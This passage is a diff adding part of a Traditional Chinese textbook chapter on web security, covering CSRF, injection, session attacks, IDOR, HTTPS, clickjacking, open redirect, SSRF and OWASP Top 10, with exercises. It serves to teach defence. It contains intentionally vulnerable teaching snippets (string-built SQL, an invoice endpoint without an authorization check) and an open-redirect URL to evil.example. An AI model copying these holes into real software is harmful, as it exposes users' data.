+  <text x="615" y="146" text-anchor="middle" font-size="12" font-weight="800" fill="#2f6f6a">bank.example.com</text>
+  <text x="615" y="170" text-anchor="middle" font-size="10" fill="#4a5159">看到有效 cookie,</text>
+  <text x="615" y="186" text-anchor="middle" font-size="10" fill="#4a5159">以為是本人,</text>
+  <text x="615" y="202" text-anchor="middle" font-size="11" font-weight="800" fill="#b4541f">執行轉帳!</text>
+
+  <!-- step 1 victim visits evil -->
+  <line x1="200" y1="150" x2="278" y2="92" stroke="#8a929b" stroke-width="2" marker-end="url(#csrf-a)"/>
+  <text x="238" y="116" text-anchor="middle" font-size="10" fill="#8a929b">① 受害者逛到惡意頁</text>
+
+  <!-- step 2 evil triggers request via victim browser -->
+  <line x1="200" y1="200" x2="538" y2="200" stroke="#b4541f" stroke-width="2.4" marker-end="url(#csrf-a)"/>
+  <text x="370" y="192" text-anchor="middle" font-size="11" font-weight="700" fill="#b4541f">② 惡意頁令瀏覽器送出 POST /transfer</text>
+  <text x="370" y="226" text-anchor="middle" font-size="10" fill="#b4541f">③ 瀏覽器「自動」附上 bank 的 session cookie</text>
+
+  <text x="360" y="280" text-anchor="middle" font-size="11" fill="#4a5159">攻擊者從頭到尾<tspan font-weight="700">沒偷到你的 cookie</tspan>,也讀不到回應(同源政策擋著);</text>
+  <text x="360" y="300" text-anchor="middle" font-size="11" fill="#4a5159">他只是<tspan font-weight="700" fill="#b4541f">借用你已登入的瀏覽器</tspan>,替你「發出」了一個你沒打算發的請求。</text>
+  <text x="360" y="326" text-anchor="middle" font-size="10.5" fill="#8a929b">這就是 CSRF 與 XSS 的根本差別:CSRF 不需讀資料,只需讓你的瀏覽器「代發」請求。</text>
+</svg>
+        <figcaption>圖 52-3:CSRF 攻擊流程(概念示意)。攻擊者無法讀取你的 cookie(同源政策擋著),但他能讓你已登入的瀏覽器,「自動帶著你的 cookie」發出一個你本無意發出的狀態變更請求(如轉帳、改密碼)。伺服器看到有效憑證,便誤以為是本人。</figcaption>
+      </div>
+
+      <p>
+        體會一下這裡的精妙之處:攻擊者<strong>從頭到尾沒有偷到你的 cookie</strong>,也因為同源政策而<strong>讀不到銀行的回應</strong>。
+        他做的只是「<strong>借用</strong>你那個已登入的瀏覽器,替你發出一個你沒打算發的請求」。
+        所以 CSRF 攻擊的目標,通常是會<strong>改變狀態</strong>的操作:轉帳、改 email、改密碼、刪資料——
+        因為攻擊者讀不到結果,純粹的「讀取」對他沒意義。
+      </p>
+
+      <h3>防禦一:CSRF token</h3>
+      <p>
+        CSRF 之所以成立,是因為伺服器分不出「這個帶著有效 cookie 的請求,到底是使用者<em>本人</em>在我的頁面上操作的,
+        還是被某個惡意網站<em>偽造</em>的」。<strong>CSRF token</strong> 的點子,就是給合法請求一個「惡意網站拿不到的暗號」。
+      </p>
+      <p>
+        做法:伺服器在產生表單頁面時,塞進一個<strong>隨機、不可預測、跟使用者 session 綁定</strong>的 token
+        (用 CSPRNG 產生,呼應第 36 章),通常放在一個隱藏欄位裡。當使用者真的送出表單,這個 token 會一起被送回來,
+        伺服器核對相符才執行。關鍵在於:<strong>惡意網站受同源政策限制,讀不到你銀行頁面裡的這個 token</strong>,
+        所以它偽造的請求湊不出正確暗號,當場被擋。
+      </p>
+      <pre><code class="language-html">&lt;!-- 伺服器產生表單時,埋入一個與此 session 綁定的隨機 token --&gt;
+&lt;form action="/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="csrf_token" value="9f3a...隨機且不可預測..."&gt;
+  &lt;input name="amount"&gt;
+  &lt;button&gt;轉帳&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+      <pre><code class="language-python"># 伺服器端:核對 token,不符就拒絕(失敗時倒向「拒絕」——fail securely)
+@app.route("/transfer", methods=["POST"])
+def transfer():
+    if not constant_time_eq(request.form.get("csrf_token"), session.get("csrf_token")):
+        abort(403)            # token 缺失或不符 → 拒絕,絕不執行
+    do_transfer(...)</code></pre>
+
+      <h3>防禦二:SameSite cookie</h3>
+      <p>
+        CSRF token 之外,還有一個更釜底抽薪的近代防線,直接從「cookie 要不要自動附上」這件事下手:
+        <strong><code>SameSite</code> cookie 屬性</strong>。它讓你告訴瀏覽器「這個 cookie,在<strong>跨站</strong>請求時,
+        要不要自動帶上」。三個值:
+      </p>
+      <ul>
+        <li><strong><code>SameSite=Strict</code>:</strong>最嚴。只要請求是從<strong>別的站</strong>發起的,cookie 一律<strong>不帶</strong>。
+        CSRF 直接失效。代價:從外站連結點進來時,會「看起來像沒登入」(因為第一個請求不帶 cookie),體驗略受影響。</li>
+        <li><strong><code>SameSite=Lax</code>:</strong>折衷,也是現代瀏覽器的<strong>預設值</strong>。跨站的「<strong>頂層導覽 GET</strong>」
+        (例如點連結跳過來)會帶 cookie,但跨站的 <strong>POST、以及背景發起的請求</strong>(圖片、表單自動送出、<code>fetch</code>)
+        <strong>不帶</strong> cookie。這恰好擋住了 CSRF 最常用的「跨站 POST」手法,又不太傷使用體驗。</li>
+        <li><strong><code>SameSite=None</code>:</strong>完全不限制(任何跨站請求都帶 cookie),必須同時加 <code>Secure</code>。
+        只有在你<em>真的</em>需要跨站帶 cookie(如某些第三方嵌入)時才用,等於放棄這層保護。</li>
+      </ul>
+      <p>
+        為什麼 <code>SameSite=Lax</code>(甚至 <code>Strict</code>)能緩解 CSRF?回頭看圖 52-3:CSRF 的命脈,
+        是「惡意頁面發起的跨站請求,瀏覽器自動帶上了銀行 cookie」。<code>SameSite=Lax</code> 正好把
+        「跨站背景 POST 帶 cookie」這條路截斷——惡意頁面替你發的轉帳 POST,根本不會帶上你的 session cookie,
+        銀行就當你沒登入,攻擊瓦解。
+      </p>
+
+      <div class="callout key">
+        <div class="ico">🔑</div>
+        <div class="body">
+          <span class="c-title">CSRF 的兩道現代防線,一起用</span>
+          <p><strong>① CSRF token</strong>(惡意站拿不到的暗號)+ <strong>② <code>SameSite</code> cookie</strong>
+          (跨站乾脆不帶 cookie),是今天防 CSRF 的標準組合。兩者互補:<code>SameSite</code> 由瀏覽器強制、覆蓋面廣,
+          但你不能假設所有使用者的瀏覽器都正確支援;CSRF token 是應用層自己把關,不依賴瀏覽器行為。
+          縱深防禦的老道理——別把命押在單一層。順帶一提:CSRF 防的是「狀態變更操作」,所以<strong>把
+          GET 設計成不改變狀態</strong>(GET 只讀、改用 POST/PUT/DELETE 改資料)本身也是一層保護。</p>
+        </div>
+      </div>
+
+      <div class="exercise">
+        <div class="ex-head">✏️ 練習 52.2 <span class="badge">思考</span></div>
+        <div class="ex-body">
+          <p>你的同事說:「我們網站要求登入才能改密碼,而且改密碼一定要帶著有效的 session cookie,
+          所以不可能被 CSRF 攻擊吧?」請指出他的誤解,用一兩句話說明 CSRF 為什麼正好<strong>利用</strong>了
+          「自動帶 cookie」這件事,並提出兩個具體的防禦設計。</p>
+          <details class="solution">
+            <summary>看解答</summary>
+            <div class="sol-body">
+              <p><strong>誤解所在:</strong>「需要有效 cookie」<em>恰恰</em>是 CSRF 能成立的原因,而不是它的剋星。
+              因為瀏覽器在發請求給你的網站時,會<strong>自動</strong>附上該站的 cookie——<strong>無論這個請求是使用者本人發起的,
+              還是某個惡意網站偷偷發起的</strong>。所以「帶著有效 cookie」這件事,惡意網站不費吹灰之力就能滿足:
+              它只要讓受害者(已登入狀態)的瀏覽器,對你的「改密碼」端點發出一個請求即可。攻擊者全程不需要、
+              也偷不到 cookie 本身,他只是借用了受害者已登入的瀏覽器。</p>
+              <p><strong>兩個防禦設計:</strong></p>
+              <ol>
+                <li><strong>CSRF token:</strong>改密碼表單裡放一個隨機、與 session 綁定、不可預測的 token,
+                送出時一併驗證。惡意網站受同源政策限制,讀不到這個 token,偽造的請求就湊不出正確暗號,被擋下。</li>
+                <li><strong><code>SameSite=Lax</code> 或 <code>Strict</code> 的 session cookie:</strong>
+                讓瀏覽器在「跨站發起的請求」時不自動帶上 session cookie,惡意網站發的改密碼請求因此「未登入」,失敗。</li>
+              </ol>
+              <p>更進一步:敏感操作(改密碼)應<strong>要求重新輸入目前密碼</strong>——這是攻擊者完全不知道的東西,
+              提供了與 CSRF token 互補的一層防護。</p>
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <h2>注入:在 Web 脈絡裡再看一次</h2>
+      <p>
+        <strong>第 36 章</strong>已經把注入講透,這裡只在 Web 的脈絡下快速複習,並補上一個 Web 特別關心的角度。
+        記住那句核心:<strong>所有注入,都是「資料」越界變成了「指令/語法」。</strong>
+      </p>
+
+      <h3>SQL 注入</h3>
+      <p>
+        Web 應用最典型的注入,是把使用者輸入(來自表單、網址參數、JSON body)拼進 SQL 查詢。攻擊者用一段精心構造的輸入,
+        讓 WHERE 條件恆真、或把後面的檢查註解掉,就能繞過登入、撈出整張表、甚至(設定不當時)竄改或刪除資料。
+        解法是<strong>參數化查詢(prepared statement)</strong>——把資料和指令徹底分開,讓資料庫永遠把參數當「純資料」:
+      </p>
+      <pre><code class="language-python"># ⛔ 把使用者輸入拼進 SQL(f-string 跟字串相加一樣致命)
+def find_user(name):
+    return db.execute(f"SELECT * FROM users WHERE name = '{name}'")
+
+# ✅ 參數化:資料走獨立通道,無論裡面有什麼引號都不會變成 SQL 語法
+def find_user(name):
+    return db.execute("SELECT * FROM users WHERE name = ?", (name,))</code></pre>
+
+      <h3>命令注入,以及「最小權限」在 Web 的份量</h3>
+      <p>
+        若 Web 後端把使用者輸入拼進一條<strong>系統指令</strong>交給 shell(例如某個「線上工具」呼叫外部程式),
+        就是命令注入。解法同樣是「不經 shell、用參數陣列直接執行」,並對輸入做白名單驗證(細節見第 36 章)。
+        這裡要特別強調 Web 場景下三個彼此呼應的防線:
+      </p>
+      <ul>
+        <li><strong>參數化 / 分離通道:</strong>從機制上讓資料不可能被當成指令(SQL、shell、LDAP……皆然)。</li>
+        <li><strong>輸入驗證(白名單):</strong>在信任邊界擋掉不合法的輸入,是第一道、但不是唯一一道防線。</li>
+        <li><strong>最小權限(least privilege):</strong>Web 應用連資料庫的帳號,<strong>只給它需要的權限</strong>——
+        若它只需讀寫幾張表,就別給它 <code>DROP TABLE</code> 或存取其他資料庫的權力。這樣即使注入沒擋住,
+        攻擊者能造成的破壞也被框在最小範圍。資料庫不該用最高權限帳號連線,Web 程序也不該用 root 跑。</li>
+      </ul>
+
+      <div class="callout note">
+        <div class="ico">🔗</div>
+        <div class="body">
+          <span class="c-title">注入的細節在第 36 章</span>
+          <p>SQL 注入的逐步成因(單引號如何「跳出」字串、<code>--</code> 如何註解掉密碼檢查)、命令注入的 shell 元字元、
+          以及更多 before/after,都在<strong>第 36 章</strong>有完整圖解與練習。這一章我們把焦點放在 Web 獨有的攻擊面;
+          注入只是順道把「它在 Web 也很常見」這件事釘牢。</p>
+        </div>
+      </div>
+
+      <h2>認證與工作階段安全</h2>
+      <p>
+        HTTP 是無狀態的(第 25 章),所以「你是誰、你登入了沒」這件事,全靠 <strong>cookie + session</strong> 這套機制人工維持。
+        既然 session 代表你的身分,它就成了攻擊者的頭號目標。這一節把幾個高頻地雷掃過。
+      </p>
+
+      <h3>cookie 與 session 機制</h3>
+      <p>
+        最常見的做法:使用者登入成功後,伺服器產生一個又長又隨機的 <strong>session ID</strong>,
+        一邊存在伺服器端(對應到「這是哪個使用者」),一邊用 <code>Set-Cookie</code> 發給瀏覽器。
+        之後每個請求,瀏覽器自動帶上這個 cookie,伺服器一查就「想起你是誰」。所以 session ID 等同你的<strong>臨時通行證</strong>——
+        誰拿到它,誰就是你。
+      </p>
+
+      <h3>兩種偷通行證的手法:劫持與固定</h3>
+      <ul>
+        <li><strong>工作階段劫持(session hijacking):</strong>攻擊者設法<strong>取得</strong>你既有的 session ID——
+        透過 XSS 偷 cookie、在不安全的 Wi-Fi 上竊聽未加密的連線、或從外洩的日誌裡撿到。拿到就能直接冒充你。</li>
+        <li><strong>工作階段固定(session fixation):</strong>反過來,攻擊者先<strong>給</strong>你一個他已知的 session ID,
+        誘使你用它登入;若伺服器登入前後沿用同一個 ID,你登入成功後,攻擊者手上那個 ID 也一起「升級」成已驗證。</li>
+      </ul>
+      <p>防禦原則:</p>
+      <ul>
+        <li><strong>登入成功的那一刻,重新產生 session ID</strong>(丟掉舊的、發新的)——直接消滅 session fixation。</li>
+        <li>session ID 用 <strong>CSPRNG</strong> 產生(夠長、不可預測),別用可猜的流水號。</li>
+        <li>全程 <strong>HTTPS</strong>,讓 session cookie 不可能在傳輸途中被竊聽。</li>
+        <li>設定合理的<strong>逾時與登出</strong>機制,縮短通行證的有效窗口。</li>
+      </ul>
+
+      <h3>安全的 cookie 屬性:把通行證鎖好</h3>
+      <p>
+        前面零散提過,這裡一次整理。一個存放 session 的 cookie,該長這樣:
+      </p>
+      <pre><code class="language-text">Set-Cookie: session=&lt;CSPRNG 產生的隨機值&gt;; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600</code></pre>
+      <div class="table-wrap">
+      <table>
+        <thead><tr><th>屬性</th><th>作用</th><th>擋掉什麼</th></tr></thead>
+        <tbody>
+          <tr><td><code>HttpOnly</code></td><td>JavaScript 讀不到此 cookie(<code>document.cookie</code> 看不見)</td><td>XSS 偷 session</td></tr>
+          <tr><td><code>Secure</code></td><td>只在 HTTPS 連線上傳送</td><td>明文連線上被竊聽</td></tr>
+          <tr><td><code>SameSite=Lax/Strict</code></td><td>跨站請求不自動帶上此 cookie</td><td>CSRF</td></tr>
+          <tr><td><code>Path</code> / <code>Domain</code></td><td>限制 cookie 的適用範圍</td><td>過度曝露給不相關路徑/子網域</td></tr>
+          <tr><td><code>Max-Age</code> / <code>Expires</code></td><td>設定有效期限</td><td>過期通行證被長期濫用</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <div class="callout tip">
+        <div class="ico">💡</div>
+        <div class="body">
+          <span class="c-title">JWT 一句話</span>
+          <p>除了「session ID + 伺服器端記憶」這條傳統路線,你也會看到 <strong>JWT(JSON Web Token)</strong>:
+          一個由伺服器<strong>簽章</strong>、內含使用者資訊的自帶 token,讓伺服器不必存 session 狀態(無狀態驗證)。
+          它很方便,但有自己的坑(務必<strong>驗證簽章</strong>、拒絕 <code>alg=none</code>、別在 payload 放敏感資料、
+          token 一旦發出難以即時撤銷)——這些細節超出本章,知道它的存在與「要驗簽」這條鐵律即可。</p>
+        </div>
+      </div>
+
+      <h3>密碼儲存與多因素</h3>
+      <p>
+        認證的根基是密碼,而密碼的儲存有兩條鐵律,我們在<strong>第 35 章</strong>(密碼學)與
+        <strong>第 34 章</strong>(資安基礎)都立過,這裡再釘一次:
+      </p>
+      <ul>
+        <li><strong>絕不明文存密碼,絕不用快速雜湊。</strong>用<strong>專為密碼設計的慢雜湊</strong>
+        (bcrypt、scrypt、Argon2),它們內建<strong>加鹽(salt)</strong>讓相同密碼產生不同雜湊、且刻意計算很慢,
+        讓暴力破解不划算(呼應第 35 章)。一句話:用現成函式庫,別自己發明。</li>
+        <li><strong>提供並鼓勵多因素認證(MFA)。</strong>密碼會被猜中、被釣走、被外洩;MFA 多要一個「不同種類」的因素
+        (你<em>持有</em>的手機、你<em>本身</em>的生物特徵),即使密碼被竊,攻擊者仍缺一塊(呼應第 34 章)。
+        MFA 是性價比最高的個人資安措施,沒有之一。</li>
+      </ul>
+
+      <h2>授權:你能不能做這件事?</h2>
+      <p>
+        <strong>認證(authentication)</strong>回答「你是誰」;<strong>授權(authorization)</strong>回答「你能做什麼」。
+        兩者常被混為一談,但它們是<strong>兩個獨立的洞</strong>——而授權出錯,常年高居 OWASP Top 10 的<strong>第一名</strong>。
+        為什麼?因為它太容易被忽略:開發者把心力都花在「登入機制」上,卻忘了在每個敏感操作前,再問一句
+        「這個<em>已登入</em>的人,有權碰<em>這筆</em>資料嗎?」
+      </p>
+
+      <h3>IDOR:把 1042 改成 1043</h3>
+      <p>
+        最經典的授權漏洞,叫<strong>不安全的直接物件參考(Insecure Direct Object Reference,IDOR)</strong>。
+        想像一個看帳單的端點:
+      </p>
+      <pre><code class="language-python"># ⛔ 只檢查「有沒有登入」,沒檢查「這張帳單是不是你的」
+@app.route("/invoice")
+def get_invoice():
+    invoice_id = request.args.get("id")        # 例如 /invoice?id=1042
+    invoice = db.get_invoice(invoice_id)
+    return render_invoice(invoice)             # 任何登入者改 id 就能看別人的帳單</code></pre>
+      <p>
+        使用者 A 登入後,看到自己的帳單網址是 <code>/invoice?id=1042</code>。他把 <code>1042</code> 改成
+        <code>1043</code>、<code>1044</code>……就翻出了<strong>別人</strong>的帳單。程式「認證」沒問題(他確實登入了),
+        但「授權」整個缺席——它從沒檢查「這張帳單的擁有者,是不是當前這個使用者」。修法:
+      </p>
+      <pre><code class="language-python"># ✅ 在伺服器端比對「這筆資源是否屬於當前使用者」
+@app.route("/invoice")
+def get_invoice():
+    invoice_id = request.args.get("id")
+    invoice = db.get_invoice(invoice_id)
+    if invoice is None or invoice.owner_id != current_user.id:
+        abort(404)                              # 不是你的 → 當作不存在
+    return render_invoice(invoice)</code></pre>
+      <p>
+        延伸的還有<strong>權限提升(privilege escalation)</strong>:一般使用者透過某些手法取得管理員權限;
+        以及<strong>功能級存取控制缺失(missing function-level access control)</strong>:管理功能的端點(如
+        <code>/admin/deleteUser</code>)沒在伺服器端檢查「呼叫者是不是管理員」,於是任何人直接打那個網址就能用。
+      </p>
+
+      <div class="callout danger">
+        <div class="ico">⛔</div>
+        <div class="body">
+          <span class="c-title">「把按鈕藏起來」不是安全</span>
+          <p>新手最常見的授權誤解:「我在前端把『刪除使用者』的按鈕對非管理員<strong>隱藏</strong>了,他們就點不到了。」
+          錯。前端隱藏的只是<strong>畫面</strong>,不是<strong>能力</strong>。任何人都能打開瀏覽器的開發者工具、
+          看 JavaScript 怎麼發請求,然後<strong>直接手動發出那個請求</strong>——根本不需要那顆按鈕。
+          <strong>所有授權檢查,都必須在「伺服器端」做,而且要在「每一個」敏感操作上做。</strong>
+          前端的隱藏/禁用,只是<strong>使用體驗</strong>(不給使用者看他用不到的東西),<strong>從來不是安全機制</strong>。
+          這條原則,值得你刺在心上。</p>
+        </div>
+      </div>
+
+      <div class="exercise">
+        <div class="ex-head">✏️ 練習 52.3 <span class="badge">思考</span></div>
+        <div class="ex-body">
+          <p>對下面三個情境,各判斷它<strong>主要</strong>屬於哪一種漏洞(IDOR / XSS / CSRF),並用一句話說明理由與修法方向:</p>
+          <ol>
+            <li>論壇的「個人簡介」欄位允許填任意文字,而頁面把它直接顯示出來。某使用者在簡介裡填入一段
+            <code>&lt;script&gt;</code>,結果其他人一瀏覽他的個人頁,瀏覽器就執行了那段腳本。</li>
+            <li>某 API 是 <code>GET /api/orders/{id}</code>,登入後可查訂單。小明發現把 <code>id</code> 從自己的
+            <code>5001</code> 改成 <code>5002</code>,就看到了別人的訂單明細。</li>
+            <li>一個惡意網頁裡藏了一段會自動送出的表單,目標是 <code>POST https://shop.example/account/email</code>
+            (修改帳號信箱)。受害者(在另一分頁已登入 shop)一打開該惡意網頁,信箱就被改成攻擊者的了。</li>
+          </ol>
+          <details class="solution">
+            <summary>看解答</summary>
+            <div class="sol-body">
+              <ol>
+                <li><strong>儲存型 XSS。</strong>使用者輸入(簡介)被存進伺服器、又原封不動嵌進 HTML,腳本在每個瀏覽者的瀏覽器執行。
+                修法:<strong>輸出編碼</strong>(顯示時把 <code>&lt; &gt; &amp; " '</code> 轉成實體),搭配 CSP 與 <code>HttpOnly</code> cookie。</li>
+                <li><strong>IDOR(授權問題)。</strong>認證通過(已登入),但缺少「這筆訂單是否屬於當前使用者」的<strong>授權檢查</strong>,
+                靠改 <code>id</code> 就能越權看別人資料。修法:在伺服器端比對 <code>order.owner_id == current_user.id</code>,不符回 404/403。</li>
+                <li><strong>CSRF。</strong>惡意網頁讓受害者已登入的瀏覽器,自動帶著 cookie 發出一個「改信箱」的跨站 POST。
+                修法:<strong>CSRF token</strong> + <strong><code>SameSite</code> cookie</strong>,敏感操作再要求重新驗證密碼。</li>
+              </ol>
+              <p>判斷訣竅:看「攻擊者注入了會執行的腳本嗎?」(XSS)、「他靠改參數存取了不屬於他的資源嗎?」(IDOR)、
+              「他借用受害者的登入身分代發了狀態變更請求嗎?」(CSRF)。</p>
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <h2>傳輸安全:把資料鎖在路上</h2>
+      <p>
+        前面談的都是「應用層」的攻防。但別忘了<strong>第 25 章</strong>的殘酷真相:一個封包要一跳一跳穿越
+        <strong>幾十台你不認識的機器</strong>,而最原始的 HTTP 傳的是<strong>明文</strong>——沿途任何人都能竊聽、甚至竄改。
+        守住這條路,靠的是 HTTPS。
+      </p>
+
+      <h3>HTTPS / TLS:加密 + 驗證身分</h3>
+      <p>
+        <strong>HTTPS</strong> 就是 HTTP 套上 <strong>TLS(Transport Layer Security)</strong> 這層加密外殼(第 25、35 章)。
+        它一次解決兩個問題:<strong>機密性</strong>(沿途的人只看到亂碼)與<strong>真實性</strong>
+        (透過<strong>憑證</strong>確認「你連到的真的是 bank.com,不是冒牌貨」),順帶還保護<strong>完整性</strong>
+        (傳輸途中被竄改會被偵測)。它正是擋下<strong>中間人攻擊(MITM)</strong>的關鍵——攻擊者卡在你和伺服器之間,
+        若沒有有效憑證,瀏覽器會跳出警告,他就無法神不知鬼不覺地假冒對方。
+      </p>
+      <p>
+        <strong>憑證(certificate)</strong>是怎麼運作的?簡單說:由受信任的<strong>憑證授權機構(CA)</strong>
+        對「這個網域屬於這個伺服器」這件事數位簽章背書;瀏覽器內建一份它信任的 CA 名單,
+        驗證憑證鏈無誤,才相信對方身分。完整的 TLS 握手、公開金鑰、數位簽章與 PKI,在<strong>第 35 章</strong>有完整故事。
+      </p>
+
+      <h3>HSTS:強制走 HTTPS,別給降級的機會</h3>
+      <p>
+        光支援 HTTPS 還不夠。如果使用者手動打 <code>http://</code>、或攻擊者把連結偷偷改成 <code>http://</code>,
+        第一個請求仍可能走明文,給了攻擊者「<strong>降級(downgrade)</strong>」的可乘之機。
+        <strong>HSTS(HTTP Strict Transport Security)</strong>就是堵這個縫:伺服器發一個標頭,告訴瀏覽器
+        「<strong>從今以後,在這個期限內,只准用 HTTPS 連我</strong>」。
+      </p>
+      <pre><code class="language-text">Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</code></pre>
+      <p>
+        瀏覽器記住後,即使使用者打 <code>http://</code>,它也會在送出請求<em>之前</em>就自己改成 <code>https://</code>,
+        連那個可被攻擊的第一次明文請求都省掉。<code>preload</code> 更進一步,把網域登進瀏覽器內建的清單,連「第一次」都保護。
+      </p>
+
+      <h3>混合內容:一條鏈,最弱的一環說了算</h3>
+      <p>
+        假設你的頁面用 HTTPS 載入,卻在裡面用 <code>http://</code> 引入了一張圖、一段 script 或一個 CSS——
+        這叫<strong>混合內容(mixed content)</strong>。為什麼危險?因為那個走明文的資源,沿途可被竊聽或<strong>竄改</strong>;
+        若被掉包的是一段 <strong>JavaScript</strong>,攻擊者等於在你「看起來安全」的 HTTPS 頁面裡植入了任意腳本——
+        整個頁面的安全保證瞬間歸零。<strong>一條安全鏈的強度,由最弱的一環決定。</strong>所以現代瀏覽器會直接封鎖
+        高風險的混合內容。原則:HTTPS 頁面裡的<strong>所有</strong>資源都要走 HTTPS,一個都不能漏。
+      </p>
+
+      <h2>其他你該認得的 Web 弱點</h2>
+
+      <h3>點擊劫持(clickjacking)</h3>
+      <p>
+        <strong>點擊劫持</strong>是一種視覺上的騙術:攻擊者把<strong>你的真實網站</strong>用透明的 <code>&lt;iframe&gt;</code>
+        疊在他的惡意頁面上,再把一顆誘人的按鈕(「點我抽 iPhone」)放在你網站某個敏感按鈕(「確認轉帳」「刪除帳號」)
+        的正下方。使用者以為自己點的是抽獎,實際上「穿透」點到了底下你網站的真實按鈕——而且因為他確實已登入,操作就生效了。
+      </p>
+      <p>
+        防禦:用標頭告訴瀏覽器「<strong>不准把我的頁面嵌進別人的 iframe</strong>」:
+      </p>
+      <pre><code class="language-text">X-Frame-Options: DENY
+（或用較新的 CSP 寫法:）
+Content-Security-Policy: frame-ancestors 'none'</code></pre>
+
+      <h3>開放重新導向(open redirect)</h3>
+      <p>
+        很多網站有「登入後跳回原頁」的功能,網址像 <code>/login?next=/dashboard</code>。若伺服器<strong>不驗證</strong>
+        <code>next</code> 的值就照單跳轉,攻擊者可構造 <code>/login?next=https://evil.example</code>——
+        受害者看到網址開頭是你的可信網域,放心點下,卻在登入後被導到釣魚站。這叫<strong>開放重新導向</strong>,
+        常被用在釣魚的「最後一哩」。防禦:<strong>只允許跳轉到自己站內的相對路徑</strong>,或用白名單核對目標網域,
+        絕不直接信任使用者給的完整網址。
+      </p>
+
+      <h3>伺服器端請求偽造(SSRF)</h3>
+      <p>
+        <strong>SSRF(Server-Side Request Forgery)</strong>是近年竄升、在雲端時代特別致命的漏洞。
+        若你的後端會「<strong>根據使用者提供的網址去抓東西</strong>」(例如「輸入圖片 URL,我幫你下載縮圖」),
+        而沒有限制目標,攻擊者就能誘使<strong>你的伺服器</strong>去存取它本不該碰的位址——尤其是
+        <strong>內網位址</strong>(如 <code>http://localhost</code>、其他內部服務)或<strong>雲端的中繼資料服務</strong>
+        (那裡常藏著存取憑證)。注意這裡被「偽造請求」的是<em>伺服器</em>,它的網路位置往往比外部攻擊者特權得多。
+        防禦:對使用者提供的 URL 做<strong>白名單</strong>(只允許特定網域/協定)、解析後檢查是否指向內網與保留位址、
+        在網路層面隔離後端的對外連線。SSRF 也名列 OWASP Top 10。
+      </p>
+
+      <h3>安全標頭總覽</h3>
+      <p>
+        前面零散出現了好幾個 HTTP 安全標頭,它們是「設定一次、全站受惠」的高 CP 值防線。整理成一張可貼在牆上的表:
+      </p>
+      <div class="table-wrap">
+      <table>
+        <thead><tr><th>標頭</th><th>作用</th><th>範例值 / 擋什麼</th></tr></thead>
+        <tbody>
+          <tr><td><code>Content-Security-Policy</code></td><td>限制可載入/執行的資源來源</td><td><code>default-src 'self'</code>(擋 XSS)</td></tr>
+          <tr><td><code>Strict-Transport-Security</code></td><td>強制只走 HTTPS(HSTS)</td><td><code>max-age=31536000; includeSubDomains</code>(擋降級/MITM)</td></tr>
+          <tr><td><code>X-Frame-Options</code> / <code>frame-ancestors</code></td><td>禁止被嵌進 iframe</td><td><code>DENY</code>(擋點擊劫持)</td></tr>
+          <tr><td><code>X-Content-Type-Options</code></td><td>禁止瀏覽器「猜」內容型別(MIME sniffing)</td><td><code>nosniff</code></td></tr>
+          <tr><td><code>Referrer-Policy</code></td><td>控制 <code>Referer</code> 外洩多少資訊</td><td><code>strict-origin-when-cross-origin</code></td></tr>
+          <tr><td><code>Set-Cookie</code>(屬性)</td><td>鎖好 cookie</td><td><code>HttpOnly; Secure; SameSite=Lax</code></td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <h3>相依套件與供應鏈漏洞</h3>
+      <p>
+        現代 Web 專案,你自己寫的程式碼可能只佔一小部分,其餘是<strong>幾百個第三方套件</strong>(npm、pip、Maven……)。
+        每一個套件,都是你信任鏈上的一環——只要其中一個有<strong>已知漏洞</strong>,或被惡意接管(供應鏈攻擊),
+        你的網站就跟著中招。這正是 OWASP「使用有漏洞的元件」與「軟體完整性失敗」要談的(呼應第 36 章)。
+        防禦:用 <strong>SCA(相依套件掃描)</strong>工具(<code>npm audit</code>、<code>pip-audit</code>、Dependabot)持續比對已知漏洞、
+        鎖定版本、定期更新、移除用不到的相依。<strong>你的安全,等於你最弱的那個相依套件的安全。</strong>
+      </p>
+
+      <h2>OWASP Top 10 的 Web 視角</h2>
+      <p>
+        把這一章串起來看,你會發現它幾乎就是 <strong>OWASP Top 10</strong> 的導覽。OWASP(Open Worldwide Application
+        Security Project)整理的這份清單,是 Web 安全最權威的「自我檢查起點」——每次設計或審查網站,
+        都可以拿它逐條問「我這裡守住了嗎?」下表用 Web 的視角,把 2021 版十大類別對應到本章的小節:
+      </p>
+      <div class="table-wrap">
+      <table>
+        <thead><tr><th>代號</th><th>類別</th><th>Web 視角一句話</th><th>本章對應</th></tr></thead>
+        <tbody>
+          <tr><td>A01</td><td>權限控制失當</td><td>改網址/參數就越權看別人資料(IDOR)、管理端點沒檢查權限</td><td>授權一節</td></tr>
+          <tr><td>A02</td><td>加密機制失敗</td><td>沒上 HTTPS、混合內容、明文存密碼、弱雜湊</td><td>傳輸安全 / 認證</td></tr>
+          <tr><td>A03</td><td>注入</td><td>SQL/命令注入、<strong>XSS</strong>——資料被當指令</td><td>XSS / 注入</td></tr>
+          <tr><td>A04</td><td>不安全的設計</td><td>設計時就沒做威脅建模,不是補一行能救的</td><td>威脅建模(第 34 章)</td></tr>
+          <tr><td>A05</td><td>安全設定錯誤</td><td>少了安全標頭、CORS 開太大、debug 上線、預設密碼</td><td>CORS / 安全標頭</td></tr>
+          <tr><td>A06</td><td>使用有漏洞的元件</td><td>前端/後端相依套件帶著已知漏洞</td><td>供應鏈一節</td></tr>
+          <tr><td>A07</td><td>身分驗證失敗</td><td>session 管理不當、無防暴力破解、缺 MFA</td><td>認證與工作階段</td></tr>
+          <tr><td>A08</td><td>軟體與資料完整性失敗</td><td>不安全的反序列化、未驗證的更新/CDN 來源</td><td>供應鏈一節</td></tr>
+          <tr><td>A09</td><td>記錄與監控不足</td><td>被入侵好幾個月卻渾然不知</td><td>把安全變流程</td></tr>
+          <tr><td>A10</td><td>伺服器端請求偽造(SSRF)</td><td>誘使伺服器去抓內網/雲端中繼資料</td><td>SSRF 一節</td></tr>
+        </tbody>
+      </table>
+      </div>
+      <p>
+        你也許注意到了:CSRF 沒有單獨列在 2021 版 Top 10 裡。這不是因為它不重要,而是因為現代框架的
+        <strong>CSRF token</strong> 與瀏覽器預設的 <strong><code>SameSite</code></strong> 已經把它壓制得相當好——
